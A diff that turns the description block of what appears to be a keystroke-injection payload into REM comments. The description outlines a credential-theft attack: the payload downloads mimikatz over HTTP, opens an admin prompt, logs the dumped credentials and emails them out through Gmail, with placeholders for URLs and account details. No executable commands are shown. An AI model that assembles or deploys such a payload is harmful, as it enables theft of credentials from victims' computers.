@@ -1,19 +1,19 @@
-This payload:  
-1. Downloads appropriate mimikatz version via http (I used dropbox)  
-2. Opens a admin prompt  
-3. saves mimikatz log to file  
-4. emails log via gmail  
-
-
-please change these lines to something (keep the single quote):  
-'url to 32bit mimikatz.exe'  
-'url to 64bit mimikatz.exe'  
-'gmailuser', 'gmail password'  
-'sending email account'  
-'email account to send report'  
-
-
-Sorry about the wacky delays!  
+REM This payload:  
+REM 1. Downloads appropriate mimikatz version via http (I used dropbox)  
+REM 2. Opens a admin prompt  
+REM 3. saves mimikatz log to file  
+REM 4. emails log via gmail  
+REM 
+REM 
+REM please change these lines to something (keep the single quote):  
+REM 'url to 32bit mimikatz.exe'  
+REM 'url to 64bit mimikatz.exe'  
+REM 'gmailuser', 'gmail password'  
+REM 'sending email account'  
+REM 'email account to send report'  
+REM 
+REM 
+REM Sorry about the wacky delays!  
 
 
 ```
